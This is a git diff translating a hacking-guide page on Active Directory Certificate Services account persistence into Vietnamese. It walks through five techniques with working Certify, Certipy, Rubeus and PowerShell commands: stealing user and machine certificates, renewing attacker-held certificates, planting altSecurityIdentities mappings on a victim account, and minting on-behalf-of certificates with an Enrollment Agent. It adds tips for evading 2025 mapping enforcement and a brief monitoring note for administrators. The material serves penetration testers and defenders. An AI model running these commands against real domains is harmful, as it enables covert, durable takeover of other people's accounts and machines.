@@ -1,14 +1,14 @@
-# AD CS Account Persistence
+# Duy trì quyền truy cập tài khoản AD CS
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-**This is a small summary of the account persistence chapters of the awesome research from [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**<sup>[[7]](#references)</sup>
+**Đây là bản tóm tắt ngắn về các chương duy trì quyền truy cập tài khoản trong nghiên cứu tuyệt vời từ [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**<sup>[[7]](#references)</sup>
 
-## Understanding Active User Credential Theft with Certificates – PERSIST1
+## Tìm hiểu về đánh cắp thông tin xác thực của người dùng đang hoạt động bằng chứng chỉ – PERSIST1
 
-In a scenario where a certificate that allows domain authentication can be requested by a user, an attacker has the opportunity to request and steal this certificate to maintain persistence on a network. By default, the `User` template in Active Directory allows such requests, though it may sometimes be disabled.<sup>[[3]](#references)[[7]](#references)</sup>
+Trong tình huống người dùng có thể yêu cầu chứng chỉ cho phép xác thực miền, kẻ tấn công có cơ hội yêu cầu và đánh cắp chứng chỉ này để duy trì quyền truy cập trong mạng. Theo mặc định, template `User` trong Active Directory cho phép yêu cầu như vậy, mặc dù đôi khi tính năng này có thể bị vô hiệu hóa.<sup>[[3]](#references)[[7]](#references)</sup>
 
-Using [Certify](https://github.com/GhostPack/Certify) or [Certipy](https://github.com/ly4k/Certipy), you can search for enabled templates that allow client authentication and then request one:
+Bạn có thể dùng [Certify](https://github.com/GhostPack/Certify) hoặc [Certipy](https://github.com/ly4k/Certipy) để tìm các template đang bật cho phép xác thực client, sau đó yêu cầu một template:
 
 ```bash
 # Enumerate client-auth capable templates
@@ -24,9 +24,9 @@ Certify.exe request /ca:CA-SERVER\CA-NAME /template:User
 certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
 ```
 
-A certificate’s power lies in its ability to authenticate as the user it belongs to, regardless of password changes, as long as the certificate remains valid.
+Sức mạnh của chứng chỉ nằm ở khả năng xác thực với tư cách người dùng sở hữu nó, bất kể mật khẩu có thay đổi hay không, miễn là chứng chỉ còn hiệu lực.
 
-You can convert PEM to PFX and use it to obtain a TGT:
+Bạn có thể chuyển đổi PEM sang PFX và dùng nó để lấy TGT:
 
 ```bash
 # Convert PEM returned by Certify to PFX
@@ -39,11 +39,11 @@ Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /
 certipy auth -pfx user.pfx -dc-ip 10.0.0.10
 ```
 
-> Note: Combined with other techniques (see THEFT sections), certificate-based auth allows persistent access without touching LSASS and even from non-elevated contexts.
+> Lưu ý: Khi kết hợp với các kỹ thuật khác (xem các mục THEFT), xác thực dựa trên chứng chỉ cho phép duy trì quyền truy cập mà không cần chạm đến LSASS, kể cả trong các ngữ cảnh không có quyền nâng cao.
 
-## Gaining Machine Persistence with Certificates - PERSIST2
+## Duy trì quyền truy cập trên máy bằng chứng chỉ - PERSIST2
 
-If an attacker has elevated privileges on a host, they can enroll the compromised system’s machine account for a certificate using the default `Machine` template. Authenticating as the machine enables S4U2Self for local services and can provide durable host persistence:<sup>[[3]](#references)[[7]](#references)</sup>
+Nếu kẻ tấn công có quyền nâng cao trên một máy chủ, họ có thể đăng ký tài khoản máy của hệ thống bị xâm nhập để lấy chứng chỉ bằng template mặc định `Machine`. Xác thực với tư cách máy cho phép sử dụng S4U2Self cho các dịch vụ cục bộ và có thể giúp duy trì quyền truy cập lâu dài vào máy chủ:<sup>[[3]](#references)[[7]](#references)</sup>
 
 ```bash
 # Request a machine certificate as SYSTEM
@@ -53,9 +53,9 @@ Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:Machine /mach
 Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
 ```
 
-## Extending Persistence Through Certificate Renewal - PERSIST3
+## Mở rộng khả năng duy trì quyền truy cập thông qua gia hạn chứng chỉ - PERSIST3
 
-Abusing the validity and renewal periods of certificate templates lets an attacker maintain long-term access. If you possess a previously issued certificate and its private key, you can renew it before expiration to obtain a fresh, long-lived credential without leaving additional request artifacts tied to the original principal.<sup>[[3]](#references)[[7]](#references)</sup>
+Lạm dụng thời hạn hiệu lực và gia hạn của các mẫu chứng chỉ cho phép kẻ tấn công duy trì quyền truy cập lâu dài. Nếu có chứng chỉ đã được cấp trước đó cùng khóa riêng tư của nó, bạn có thể gia hạn chứng chỉ trước khi hết hạn để nhận thông tin xác thực mới có thời hạn dài mà không để lại thêm dấu vết yêu cầu gắn với principal ban đầu.<sup>[[3]](#references)[[7]](#references)</sup>
 
 ```bash
 # Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
@@ -68,20 +68,20 @@ certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
 certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
 ```
 
-> Operational tip: Track lifetimes on attacker-held PFX files and renew early. Renewal can also cause updated certificates to include the modern SID mapping extension, keeping them usable under stricter DC mapping rules (see next section).
+> Mẹo vận hành: Theo dõi thời hạn của các tệp PFX do attacker nắm giữ và gia hạn sớm. Việc gia hạn cũng có thể khiến các certificate được cập nhật bao gồm extension ánh xạ SID hiện đại, giúp chúng tiếp tục sử dụng được theo các quy tắc ánh xạ DC nghiêm ngặt hơn (xem phần tiếp theo).
 
-## Planting Explicit Certificate Mappings (altSecurityIdentities) – PERSIST4
+## Cài đặt ánh xạ certificate tường minh (altSecurityIdentities) – PERSIST4
 
-If you can write to a target account’s `altSecurityIdentities` attribute, you can explicitly map an attacker-controlled certificate to that account. This persists across password changes and, when using strong mapping formats, remains functional under modern DC enforcement.<sup>[[2]](#references)</sup>
+Nếu bạn có thể ghi vào thuộc tính `altSecurityIdentities` của tài khoản mục tiêu, bạn có thể ánh xạ tường minh một certificate do attacker kiểm soát tới tài khoản đó. Cách này vẫn tồn tại sau khi đổi password và, khi sử dụng các định dạng ánh xạ mạnh, vẫn hoạt động theo cơ chế thực thi hiện đại của DC.<sup>[[2]](#references)</sup>
 
-High-level flow:
+Quy trình tổng quát:
 
-1. Obtain or issue a client-auth certificate you control (e.g., enroll `User` template as yourself).
-2. Extract a strong identifier from the cert (Issuer+Serial, SKI, or SHA1-PublicKey).
-3. Add an explicit mapping on the victim principal’s `altSecurityIdentities` using that identifier.
-4. Authenticate with your certificate; the DC maps it to the victim via the explicit mapping.
+1. Lấy hoặc cấp một certificate xác thực client do bạn kiểm soát (ví dụ: đăng ký template `User` bằng tài khoản của bạn).
+2. Trích xuất một mã định danh mạnh từ certificate (Issuer+Serial, SKI hoặc SHA1-PublicKey).
+3. Thêm ánh xạ tường minh vào `altSecurityIdentities` của principal nạn nhân bằng mã định danh đó.
+4. Xác thực bằng certificate của bạn; DC ánh xạ certificate tới nạn nhân thông qua ánh xạ tường minh.
 
-Example (PowerShell) using a strong Issuer+Serial mapping:
+Ví dụ (PowerShell) sử dụng ánh xạ Issuer+Serial mạnh:
 
 ```powershell
 # Example values - reverse the issuer DN and serial as required by AD mapping format
@@ -93,7 +93,7 @@ $Map     = "X509:<I>$Issuer<SR>$SerialR"
 Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
 ```
 
-Then authenticate with your PFX. Certipy will obtain a TGT directly:
+Sau đó xác thực bằng PFX của bạn. Certipy sẽ lấy TGT trực tiếp:
 
 ```bash
 certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10
@@ -102,9 +102,9 @@ certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10
 certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
 ```
 
-### Building Strong `altSecurityIdentities` Mappings
+### Xây dựng mapping `altSecurityIdentities` mạnh
 
-In practice, **Issuer+Serial** and **SKI** mappings are the easiest strong formats to build from an attacker-held certificate. This matters after **February 11, 2025**, when DCs default to **Full Enforcement** and weak mappings stop being reliable.<sup>[[1]](#references)</sup>
+Trên thực tế, mapping **Issuer+Serial** và **SKI** là những định dạng mạnh dễ tạo nhất từ chứng chỉ do kẻ tấn công nắm giữ. Điều này quan trọng sau **February 11, 2025**, khi DC mặc định sử dụng **Full Enforcement** và các mapping yếu không còn đáng tin cậy.<sup>[[1]](#references)</sup>
 
 ```bash
 # Extract issuer, serial and SKI from a cert/PFX
@@ -119,15 +119,15 @@ Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
 # Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
 ```
 
-Notes
-- Use strong mapping types only: `X509IssuerSerialNumber`, `X509SKI`, or `X509SHA1PublicKey`. Weak formats (Subject/Issuer, Subject-only, RFC822 email) are deprecated and can be blocked by DC policy.
-- The mapping works on both **user** and **computer** objects, so write access to a computer account's `altSecurityIdentities` is enough to persist as that machine.
-- The cert chain must build to a root trusted by the DC. Enterprise CAs in NTAuth are typically trusted; some environments also trust public CAs.
-- Schannel authentication remains useful for persistence even when PKINIT fails because the DC lacks the Smart Card Logon EKU or returns `KDC_ERR_PADATA_TYPE_NOSUPP`.
+Ghi chú
+- Chỉ sử dụng các kiểu mapping mạnh: `X509IssuerSerialNumber`, `X509SKI` hoặc `X509SHA1PublicKey`. Các định dạng yếu (Subject/Issuer, chỉ Subject, email RFC822) đã lỗi thời và có thể bị chặn bởi chính sách DC.
+- Mapping áp dụng cho cả đối tượng **user** và **computer**, vì vậy chỉ cần quyền ghi vào `altSecurityIdentities` của tài khoản máy tính là đủ để duy trì quyền truy cập dưới danh nghĩa máy đó.
+- Chuỗi chứng chỉ phải dẫn đến một root được DC tin cậy. Các CA doanh nghiệp trong NTAuth thường được tin cậy; một số môi trường cũng tin cậy các CA công khai.
+- Xác thực Schannel vẫn hữu ích để duy trì quyền truy cập ngay cả khi PKINIT thất bại do DC thiếu EKU Smart Card Logon hoặc trả về `KDC_ERR_PADATA_TYPE_NOSUPP`.
 
-#### 2025+ `Issuer/SID` explicit mappings
+#### Các mapping tường minh `Issuer/SID` từ năm 2025 trở đi
 
-On **Windows Server 2022+** domain controllers patched with the **September 9, 2025** security update, Microsoft added another strong explicit mapping format that is attractive for persistence because it survives certificate reissuance from the same CA:<sup>[[6]](#references)</sup>
+Trên các domain controller **Windows Server 2022+** đã cài bản cập nhật bảo mật ngày **9 tháng 9 năm 2025**, Microsoft đã bổ sung một định dạng mapping tường minh mạnh khác. Định dạng này hấp dẫn để duy trì quyền truy cập vì vẫn hoạt động sau khi chứng chỉ được cấp lại từ cùng CA:<sup>[[6]](#references)</sup>
 
 ```powershell
 # Same issuer formatting rules as Issuer+Serial
@@ -137,25 +137,25 @@ $Map    = "X509:<I>$Issuer<SID>$SID"
 Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
 ```
 
-Operationally this differs from the older strong formats:
-- `Issuer+Serial` pins **one exact certificate**.
-- `SKI` / `SHA1-PUKEY` pin **one keypair**.
-- `Issuer/SID` pins the **issuing CA + target SID**, so renewed or reissued certificates from the same CA keep working without rewriting `altSecurityIdentities`.
+Về mặt vận hành, cách này khác với các định dạng mạnh hơn trước đây:
+- `Issuer+Serial` ghim **một chứng chỉ cụ thể**.
+- `SKI` / `SHA1-PUKEY` ghim **một cặp khóa**.
+- `Issuer/SID` ghim **CA cấp chứng chỉ + SID mục tiêu**, vì vậy các chứng chỉ được gia hạn hoặc cấp lại từ cùng CA vẫn hoạt động mà không cần viết lại `altSecurityIdentities`.
 
-Requirements and caveats
-- The certificate presented for logon must actually contain the target account SID in the SID security extension.
-- This format is not helpful for `ESC9` / `ESC16` style certificates that omit the SID extension; in those cases fall back to `Issuer+Serial`, `SKI`, or `SHA1-PUKEY`.
+Yêu cầu và lưu ý
+- Chứng chỉ được cung cấp khi đăng nhập phải thực sự chứa SID của tài khoản mục tiêu trong phần mở rộng bảo mật SID.
+- Định dạng này không hữu ích với các chứng chỉ kiểu `ESC9` / `ESC16` không có phần mở rộng SID; trong những trường hợp đó, hãy dùng `Issuer+Serial`, `SKI` hoặc `SHA1-PUKEY`.
 
-For more on weak explicit mappings and attack paths, see:
+Để biết thêm về các ánh xạ tường minh yếu và các đường tấn công, xem:
 
 
 {{#ref}}
 domain-escalation.md
 {{#endref}}
 
-## Enrollment Agent as Persistence – PERSIST5
+## Enrollment Agent làm cơ chế duy trì quyền truy cập – PERSIST5
 
-If you obtain a valid Certificate Request Agent/Enrollment Agent certificate, you can mint new logon-capable certificates on behalf of users at will and keep the agent PFX offline as a persistence token. Abuse workflow:<sup>[[7]](#references)</sup>
+Nếu có được chứng chỉ Certificate Request Agent/Enrollment Agent hợp lệ, bạn có thể tùy ý tạo chứng chỉ mới hỗ trợ đăng nhập thay mặt người dùng và giữ PFX của agent ngoại tuyến làm token duy trì quyền truy cập. Quy trình lạm dụng:<sup>[[7]](#references)</sup>
 
 ```bash
 # Request an Enrollment Agent cert (requires template rights)
@@ -170,15 +170,15 @@ certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
            -template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
 ```
 
-Revocation of the agent certificate or template permissions is required to evict this persistence.
+Cần thu hồi chứng chỉ agent hoặc quyền trên template để loại bỏ persistence này.
 
-Operational notes
-- Modern `Certipy` versions support both `-on-behalf-of` and `-renew`, so an attacker holding an Enrollment Agent PFX can mint and later renew leaf certificates without re-touching the original target account.<sup>[[4]](#references)</sup>
-- If PKINIT-based TGT retrieval is not possible, the resulting on-behalf-of certificate is still usable for Schannel authentication with `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell`.<sup>[[5]](#references)</sup>
+Ghi chú vận hành
+- Các phiên bản `Certipy` hiện đại hỗ trợ cả `-on-behalf-of` và `-renew`, vì vậy kẻ tấn công nắm giữ PFX của Enrollment Agent có thể tạo và sau đó gia hạn chứng chỉ leaf mà không cần tương tác lại với tài khoản mục tiêu ban đầu.<sup>[[4]](#references)</sup>
+- Nếu không thể lấy TGT dựa trên PKINIT, chứng chỉ on-behalf-of tạo ra vẫn có thể dùng để xác thực Schannel bằng `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell`.<sup>[[5]](#references)</sup>
 
-## Using Persisted Certificates When PKINIT Fails
+## Sử dụng chứng chỉ persistence khi PKINIT thất bại
 
-If the DC does not have a Smart Card Logon-capable certificate, certificate logon via PKINIT can fail with `KDC_ERR_PADATA_TYPE_NOSUPP`. That does **not** kill the persistence primitive: the same PFX is often still usable for Schannel-authenticated LDAP access.<sup>[[5]](#references)</sup>
+Nếu DC không có chứng chỉ hỗ trợ Smart Card Logon, việc đăng nhập bằng chứng chỉ qua PKINIT có thể thất bại với `KDC_ERR_PADATA_TYPE_NOSUPP`. Điều đó **không** vô hiệu hóa primitive persistence: cùng PFX đó thường vẫn có thể dùng để truy cập LDAP đã xác thực bằng Schannel.<sup>[[5]](#references)</sup>
 
 ```bash
 # LDAPS / Schannel shell as the mapped principal
@@ -188,29 +188,28 @@ certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
 certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell -ldap-scheme ldap -ldap-port 389
 ```
 
-This is especially useful after PERSIST4/PERSIST5 because you can keep operating from Linux/macOS and chain other directory persistence actions such as dropping [shadow credentials](../acl-persistence-abuse/shadow-credentials.md) or editing writable delegation attributes.
+Điều này đặc biệt hữu ích sau PERSIST4/PERSIST5 vì bạn có thể tiếp tục hoạt động từ Linux/macOS và kết hợp với các hành động duy trì quyền truy cập khác trong directory, chẳng hạn như cài [shadow credentials](../acl-persistence-abuse/shadow-credentials.md) hoặc chỉnh sửa các thuộc tính delegation có thể ghi.
 
 ## 2025 Strong Certificate Mapping Enforcement: Impact on Persistence
 
-Microsoft KB5014754 introduced Strong Certificate Mapping Enforcement on domain controllers. Since **February 11, 2025**, DCs default to **Full Enforcement** for weak/ambiguous mappings, and as of the **September 9, 2025** security update patched DCs no longer support the old Compatibility-mode fallback.<sup>[[1]](#references)</sup> Practical implications:
+Microsoft KB5014754 đã giới thiệu Strong Certificate Mapping Enforcement trên các domain controller. Kể từ **ngày 11 tháng 2, 2025**, DC mặc định sử dụng **Full Enforcement** đối với các ánh xạ yếu/mơ hồ; và kể từ bản cập nhật bảo mật **ngày 9 tháng 9, 2025**, các DC đã được vá không còn hỗ trợ cơ chế dự phòng Compatibility mode cũ.<sup>[[1]](#references)</sup> Những hệ quả thực tế:
 
-- Pre-2022 certificates that lack the SID mapping extension may fail implicit mapping when DCs are in Full Enforcement. Attackers can maintain access by either renewing certificates through AD CS (to obtain the SID extension) or by planting a strong explicit mapping in `altSecurityIdentities` (PERSIST4).
-- Explicit mappings using strong formats (`Issuer+Serial`, `SKI`, `SHA1-PUKEY`, and on modern DCs `Issuer/SID`) continue to work. Weak formats (Issuer/Subject, Subject-only, RFC822) can be blocked and should be avoided for persistence.
-- If weak mappings still appear to work, assume you hit an unpatched or differently configured DC rather than a reliable long-term persistence path.
-- `ESC9` / `ESC16` style issuance paths that suppress the SID extension make `Issuer/SID` unusable, so fallback strong mappings or renewal via a normal template become the practical persistence option.
+- Chứng chỉ được cấp trước năm 2022 không có phần mở rộng ánh xạ SID có thể không ánh xạ ngầm được khi DC sử dụng Full Enforcement. Kẻ tấn công có thể duy trì quyền truy cập bằng cách gia hạn chứng chỉ thông qua AD CS (để có phần mở rộng SID) hoặc cài một ánh xạ tường minh mạnh vào `altSecurityIdentities` (PERSIST4).
+- Các ánh xạ tường minh dùng định dạng mạnh (`Issuer+Serial`, `SKI`, `SHA1-PUKEY` và `Issuer/SID` trên DC hiện đại) vẫn hoạt động. Các định dạng yếu (Issuer/Subject, Subject-only, RFC822) có thể bị chặn và nên tránh dùng để duy trì quyền truy cập.
+- Nếu các ánh xạ yếu vẫn có vẻ hoạt động, hãy cho rằng bạn đang gặp DC chưa được vá hoặc được cấu hình khác, chứ không phải một phương thức duy trì quyền truy cập đáng tin cậy lâu dài.
+- Các phương thức cấp chứng chỉ kiểu `ESC9` / `ESC16` vô hiệu hóa phần mở rộng SID khiến `Issuer/SID` không thể sử dụng; do đó, các ánh xạ mạnh dự phòng hoặc gia hạn qua template thông thường là lựa chọn thực tế để duy trì quyền truy cập.
 
-Administrators should monitor and alert on:
-- Changes to `altSecurityIdentities` and issuance/renewals of Enrollment Agent and User certificates.
-- CA issuance logs for on-behalf-of requests and unusual renewal patterns.
+Quản trị viên nên giám sát và cảnh báo về:
+- Các thay đổi đối với `altSecurityIdentities` và việc cấp/gia hạn chứng chỉ Enrollment Agent và User.
+- Nhật ký cấp chứng chỉ của CA đối với các yêu cầu thay mặt người khác và các kiểu gia hạn bất thường.
 
 ## References
 
-- [1] [Microsoft Support – KB5014754: Certificate-based authentication changes on Windows domain controllers](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
-- [2] [SpecterOps – ADCS ESC14 Abuse Technique](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
-- [3] [GhostPack/Certify Wiki – Account Persistence Techniques](https://github.com/GhostPack/Certify/wiki/2-%E2%80%90-Account-Persistence-Techniques)
-- [4] [Certipy Wiki – Command Reference](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
-- [5] [Almond Offensive Security – Authenticating with certificates when PKINIT is not supported](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html)
-- [6] [Microsoft Community Hub – Introducing a new Issuer/SID AltSecID](https://techcommunity.microsoft.com/blog/publicsectorblog/introducing-a-new-issuersid-altsecid/4454231)
-- [7] [SpecterOps – Certified Pre-Owned: Abusing Active Directory Certificate Services](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)
-
+- [1] [Microsoft Support – KB5014754: Những thay đổi về xác thực dựa trên chứng chỉ trên bộ điều khiển miền Windows](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
+- [2] [SpecterOps – Kỹ thuật lạm dụng ADCS ESC14](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
+- [3] [GhostPack/Certify Wiki – Các kỹ thuật duy trì quyền truy cập tài khoản](https://github.com/GhostPack/Certify/wiki/2-%E2%80%90-Account-Persistence-Techniques)
+- [4] [Certipy Wiki – Tham chiếu lệnh](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
+- [5] [Almond Offensive Security – Xác thực bằng chứng chỉ khi PKINIT không được hỗ trợ](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html)
+- [6] [Microsoft Community Hub – Giới thiệu Issuer/SID AltSecID mới](https://techcommunity.microsoft.com/blog/publicsectorblog/introducing-a-new-issuersid-altsecid/4454231)
+- [7] [SpecterOps – Certified Pre-Owned: Lạm dụng Active Directory Certificate Services](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)
 {{#include ../../../banners/hacktricks-training.md}}
